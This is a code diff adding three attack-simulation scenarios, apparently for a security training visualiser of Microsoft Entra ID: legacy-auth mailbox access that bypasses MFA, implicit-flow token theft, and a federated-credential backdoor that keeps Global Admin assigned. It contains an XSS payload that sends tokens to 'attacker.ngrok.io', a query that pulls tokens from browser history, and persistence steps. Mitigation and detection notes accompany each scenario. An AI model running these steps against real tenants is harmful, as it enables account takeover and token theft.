@@ -655,3 +655,185 @@ export const entraIllicitConsentScenario = [
     action: () => highlightElement("ent_svc"),
   },
 ];
+
+// ══════════════════════════════════════════════════════════════════
+//  INITIAL ACCESS — LEGACY AUTH PROTOCOL ABUSE
+// ══════════════════════════════════════════════════════════════════
+
+// ── 13. Legacy Auth Protocol Abuse (SMTP AUTH / EWS / IMAP / ActiveSync) ──────
+export const entraLegacyAuthAbuseScenario = [
+  {
+    scenarioName: "Attack: Legacy Auth Protocol Abuse — Direct Mailbox Auth (MFA Bypass)",
+    logMessage: "Attacker Goal: Authenticate directly to Exchange Online mailboxes using legacy protocols (SMTP AUTH, EWS Basic Auth, IMAP, POP3, ActiveSync). Legacy auth bypasses Entra ID Conditional Access entirely — no MFA prompt generated.",
+    logType: "attack",
+    action: () => highlightElement("ent_attacker"),
+  },
+  {
+    logMessage: "Recon: AzureHound CA policy dump shows 'Block legacy auth' policy is NOT applied to the 'Sync accounts' group. Tenant admin re-enabled SMTP AUTH for shared mailboxes. GET /beta/identity/conditionalAccessPolicies — confirms legacy auth exclusions and exempted users.",
+    logType: "msgraph",
+    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "CA policy enum"),
+  },
+  {
+    logMessage: "Check per-user SMTP AUTH state via EXO PowerShell: Get-CASMailbox alice@corp -SmtpClientAuthenticationDisabled → $false. Legacy protocol matrix: SMTP AUTH (port 587) ✓ active, EWS ✓ active, IMAP4 ✓ active, ActiveSync ✓ active. No per-protocol block applied.",
+    logType: "info",
+    action: () => highlightElement("ent_attacker"),
+  },
+  {
+    logMessage: "SMTP AUTH attack: openssl s_client -connect smtp.office365.com:587 -starttls smtp → EHLO → AUTH LOGIN → Base64(alice@corp.com) + Base64(Spring2024!) submitted. Exchange Online accepts credentials directly — Entra ID NOT consulted. Zero MFA, zero CA policy, zero sign-in risk evaluation.",
+    logType: "http",
+    action: () => addTemporaryEdge("ent_attacker", "ent_m365", "http", "SMTP AUTH (STARTTLS)"),
+  },
+  {
+    logMessage: "Exchange Online: '235 2.7.0 Authentication successful'. Attacker sends spear-phish as alice@corp.com: MAIL FROM:<alice@corp.com> → RCPT TO:<cfo@corp.com> → DATA: [BEC invoice fraud payload]. Internal sender — bypasses all external sender warnings and SPF/DKIM checks.",
+    logType: "attack",
+    action: () => { highlightElement("ent_m365"); highlightElement("ent_user1", undefined, "compromised"); },
+  },
+  {
+    logMessage: "EWS Basic Auth attack: POST https://outlook.office365.com/EWS/Exchange.asmx (Authorization: Basic <base64(alice@corp:Spring2024!)>). SOAP GetFolder request. Exchange validates Basic credential directly against stored hash — Entra CA not in path. Returns full XML mailbox response.",
+    logType: "http",
+    action: () => addTemporaryEdge("ent_attacker", "ent_m365", "http", "EWS Basic Auth"),
+  },
+  {
+    logMessage: "Via EWS: reads inbox (FindItem), calendar (all meetings including exec boardroom bookings), contacts. Sets persistent forwarding rule via EWS UpdateInboxRules: all mail with 'invoice' or 'payment' CC'd to attacker mailbox. No Entra logs. EWS access logged only in Exchange Unified Audit Log (if enabled, not default in all SKUs).",
+    logType: "attack",
+    action: () => highlightElement("ent_m365"),
+  },
+  {
+    logMessage: "IMAP4 attack: openssl s_client -connect outlook.office365.com:993 → A1 AUTHENTICATE PLAIN <base64(\\x00alice@corp.com\\x00Spring2024!)>. Response: A1 OK AUTHENTICATE completed. Access all IMAP folders, download entire mailbox. No Entra sign-in event generated.",
+    logType: "http",
+    action: () => addTemporaryEdge("ent_attacker", "ent_m365", "http", "IMAP AUTHENTICATE PLAIN"),
+  },
+  {
+    logMessage: "Telemetry gap assessment: Entra ID Sign-In logs: ZERO entries for all attacks. Exchange Unified Audit Log: MailItemsAccessed events present — but UAL requires E3/E5 license and is not enabled by default. Identity Protection: no risk events (no Entra auth path taken). SOC alerted? No.",
+    logType: "info",
+    action: () => highlightElement("ent_tenant"),
+  },
+  {
+    logMessage: "IMPACT: Full mailbox compromise (read/send/forward/delete) without triggering a single Entra Conditional Access evaluation or sign-in log entry. MFA is entirely irrelevant for legacy auth paths — MFA is an Entra ID control, not an Exchange control. Root cause: legacy auth is a parallel authentication path. Mitigation: Set-AuthenticationPolicy to block Basic Auth per-protocol for all users, enforce via CA 'Block legacy auth' policy with ZERO exclusions.",
+    logType: "attack",
+    action: () => { highlightElement("ent_m365"); highlightElement("ent_user1"); },
+  },
+];
+
+// ══════════════════════════════════════════════════════════════════
+//  TOKEN & SESSION — IMPLICIT FLOW TOKEN HARVEST
+// ══════════════════════════════════════════════════════════════════
+
+// ── 14. OAuth2 Implicit Flow — Access Token Harvest via URL Fragment ──────────
+export const entraImplicitTokenHarvestScenario = [
+  {
+    scenarioName: "Attack: OAuth2 Implicit Flow — Access Token Harvest (URL Fragment / XSS / Referrer)",
+    logMessage: "Attacker Goal: Extract Entra ID access tokens from legacy SPA applications using the deprecated OAuth2 implicit grant flow. Tokens returned in the URL fragment (#access_token=...) — exposed to browser history, referrer headers, and any JavaScript executing in the page.",
+    logType: "attack",
+    action: () => highlightElement("ent_attacker"),
+  },
+  {
+    logMessage: "Identify target SPA: corp-portal.corp.com. App registration recon: GET /v1.0/applications/{appId}?$select=web → web.implicitGrantSettings.enableAccessTokenIssuance=true. Implicit flow enabled — tokens returned in URL fragment rather than via secure back-channel POST /token.",
+    logType: "msgraph",
+    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "app implicit grant check"),
+  },
+  {
+    logMessage: "Alice authenticates normally to corp-portal: GET https://login.microsoftonline.com/.../authorize?response_type=token+id_token&scope=openid+Mail.Read&redirect_uri=https://corp-portal.corp.com/auth/callback. Completes password + MFA. Entra redirects.",
+    logType: "oidc",
+    action: () => addTemporaryEdge("ent_dev1", "ent_tenant", "oidc", "GET /authorize (implicit)"),
+  },
+  {
+    logMessage: "Entra ID → Browser: HTTP 302 Location: https://corp-portal.corp.com/auth/callback#access_token=eyJ0eXAiOiJKV1Q...&token_type=Bearer&expires_in=3600&scope=Mail.Read&id_token=eyJ0eXA.... Token is in the URL FRAGMENT — browser stores full URL in history. Fragment sent to page JavaScript via window.location.hash, never transmitted to server.",
+    logType: "oidc",
+    action: () => addTemporaryEdge("ent_tenant", "ent_dev1", "oidc", "302 → #access_token"),
+  },
+  {
+    logMessage: "Attack Vector A — Browser History Extraction: Malware/LotL reads browser history SQLite DB (e.g., %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\History). SQL: SELECT url FROM urls WHERE url LIKE '%access_token%'. Recovers full URL with JWT. Token valid 1h from issuance.",
+    logType: "attack",
+    action: () => highlightElement("ent_attacker"),
+  },
+  {
+    logMessage: "Attack Vector B — Referrer Header Leak: corp-portal.corp.com includes Google Analytics (<script src='https://www.googletagmanager.com/...'/>). Browser includes Referer: https://corp-portal.corp.com/auth/callback#access_token=eyJ0... header in request to GTM CDN. Access token sent in cleartext to third-party analytics.",
+    logType: "http",
+    action: () => highlightElement("ent_attacker"),
+  },
+  {
+    logMessage: "Attack Vector C — XSS Token Exfil: Stored XSS in corp-portal comment field. Payload: <img src=x onerror=\"fetch('https://attacker.ngrok.io/?t='+encodeURIComponent(window.location.hash+sessionStorage.getItem('msal.token')))\">. Captures both URL fragment token AND any MSAL-cached tokens from sessionStorage.",
+    logType: "attack",
+    action: () => addTemporaryEdge("ent_attacker", "ent_dev1", "http", "XSS → hash + storage exfil"),
+  },
+  {
+    logMessage: "Attacker replays stolen access_token: GET https://graph.microsoft.com/v1.0/me/messages (Authorization: Bearer <stolen_AT>). MS Graph: validates JWT — aud=graph.microsoft.com ✓, scp=Mail.Read ✓, exp not reached ✓. Returns Alice's inbox. 1h window: sufficient for email exfil + directory recon.",
+    logType: "msgraph",
+    action: () => { addTemporaryEdge("ent_attacker", "ent_m365", "msgraph", "GET /me/messages (stolen)"); highlightElement("ent_user1", undefined, "compromised"); },
+  },
+  {
+    logMessage: "Key constraint: implicit flow does NOT issue refresh_tokens (RFC 6749 §4.2, by design). Attacker has 1h window per token. However: re-triggering the authorize endpoint with prompt=none silently issues new access_token if session cookie active. Attacker can loop prompt=none requests from iframe to harvest fresh tokens indefinitely.",
+    logType: "attack",
+    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "oidc", "prompt=none silent re-auth"),
+  },
+  {
+    logMessage: "IMPACT: Implicit flow exposes access tokens to any JavaScript on the page, browser extensions, history, and referrer-receiving third parties — the attack surface is every line of JavaScript and every HTTP link. MSAL.js v2+ (auth code + PKCE) eliminates this by issuing tokens via back-channel POST only. Mitigation: disable enableAccessTokenIssuance in app registration, migrate to MSAL.js 2.x PKCE flow. Entra now warns in portal when implicit flow is enabled.",
+    logType: "attack",
+    action: () => highlightElement("ent_dev1"),
+  },
+];
+
+// ══════════════════════════════════════════════════════════════════
+//  PRIVILEGE ESCALATION — WORKLOAD IDENTITY FEDERATION ABUSE
+// ══════════════════════════════════════════════════════════════════
+
+// ── 15. Workload Identity Federation Abuse (OIDC Federated Credential Backdoor) ─
+export const entraWIFAbuseScenario = [
+  {
+    scenarioName: "Attack: Workload Identity Federation Abuse — Secretless Persistent Backdoor via External OIDC",
+    logMessage: "Attacker Goal: Add an OIDC federated identity credential to a high-privilege app registration. An attacker-controlled external OIDC provider (GitHub Actions) can then exchange its tokens for Entra SP tokens — no client secret required, no credential to scan or rotate.",
+    logType: "attack",
+    action: () => highlightElement("ent_attacker"),
+  },
+  {
+    logMessage: "Prerequisite: Attacker holds Application Administrator session (or is Owner of AppReg-01). Target: AppReg-01 has Application Permission RoleManagement.ReadWrite.Directory — direct Global Admin escalation primitive. WIF allows external OIDC IdPs to vouch for app identity without a stored secret.",
+    logType: "setup",
+    action: () => { highlightElement("ent_admin", undefined, "compromised"); highlightElement("ent_svc"); },
+  },
+  {
+    logMessage: "Attacker creates GitHub repo: github.com/attacker-org/infra-sync (private). GitHub's OIDC provider issues JWTs per workflow run: iss=https://token.actions.githubusercontent.com, sub=repo:attacker-org/infra-sync:ref:refs/heads/main, aud=<configurable>. Token signed with GitHub's OIDC keys (JWKS published publicly).",
+    logType: "attack",
+    action: () => highlightElement("ent_attacker"),
+  },
+  {
+    logMessage: "Attacker → MS Graph (as App Admin): POST /v1.0/applications/{AppReg01_objectId}/federatedIdentityCredentials { name: 'github-infra-sync', issuer: 'https://token.actions.githubusercontent.com', subject: 'repo:attacker-org/infra-sync:ref:refs/heads/main', audiences: ['api://AzureADTokenExchange'] }. Returns 201 Created.",
+    logType: "msgraph",
+    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "POST /federatedIdentityCredentials"),
+  },
+  {
+    logMessage: "Audit event written: 'Update application — Add federated identity credential'. No client_secret created. No password. Credential scanners (GitLeaks, TruffleHog, Defender CSPM) find no secrets to alert on — FIC is a trust relationship, not a credential string. Zero byte secret footprint.",
+    logType: "attack",
+    action: () => highlightElement("ent_svc", undefined, "compromised"),
+  },
+  {
+    logMessage: "Attacker triggers GitHub Actions workflow (github.com/attacker-org/infra-sync/.github/workflows/sync.yml, permissions: id-token: write). GitHub OIDC issues signed JWT to workflow environment: {iss, sub=repo:attacker-org/infra-sync:ref:refs/heads/main, aud=api://AzureADTokenExchange, jti}.",
+    logType: "oidc",
+    action: () => highlightElement("ent_attacker"),
+  },
+  {
+    logMessage: "GitHub Action → Entra ID: POST /oauth2/v2.0/token { client_id: <AppReg01_appId>, client_assertion_type: urn:ietf:params:oauth:client-assertion-type:jwt-bearer, client_assertion: <GitHub_OIDC_JWT>, grant_type: client_credentials, scope: https://graph.microsoft.com/.default }.",
+    logType: "oidc",
+    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "oidc", "WIF token exchange (GitHub→Entra)"),
+  },
+  {
+    logMessage: "Entra ID WIF validation: fetches GitHub's public JWKS (https://token.actions.githubusercontent.com/.well-known/openid-configuration → jwks_uri). Validates JWT signature, issuer, subject, audience against registered FIC entry. All match → issues access_token for AppReg-01 SP.",
+    logType: "oidc",
+    action: () => addTemporaryEdge("ent_tenant", "ent_attacker", "oidc", "SP access_token (roles: RoleManagement.RW)"),
+  },
+  {
+    logMessage: "Attacker (via GitHub Actions scheduled cron: '0 */6 * * *'): POST /v1.0/roleManagement/directory/roleAssignments { principalId: <attacker_SP>, roleDefinitionId: '62e90394-...' (GlobalAdministrator) }. GA assigned every 6h. If removed by defenders, workflow re-assigns within 6h automatically.",
+    logType: "msgraph",
+    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "POST /roleAssignments (GA, cron)"),
+  },
+  {
+    logMessage: "DETECTION: Entra Audit Log shows 'Add federated identity credential' at creation — one event, easy to miss. Subsequent WIF token issuances appear as normal SP auth events. FIC not visible in 'Certificates & secrets' portal blade — requires navigating to 'Federated credentials' tab or GET /applications/{id}/federatedIdentityCredentials. Defender for Cloud Apps App Governance: alert on 'New federated credential added to privileged app'.",
+    logType: "info",
+    action: () => highlightElement("ent_tenant"),
+  },
+  {
+    logMessage: "IMPACT: Secretless, rotation-proof, scanner-invisible, self-healing persistent backdoor. Removes a GitHub repo's authentication cost (no secrets to protect). Persists through: client secret rotation, certificate rotation, password changes, MFA resets. Removal requires finding and deleting the FIC entry specifically. Increasingly used by nation-state actors as post-compromise persistence on cloud-native workloads.",
+    logType: "attack",
+    action: () => { highlightElement("ent_svc"); highlightElement("ent_tenant"); },
+  },
+];
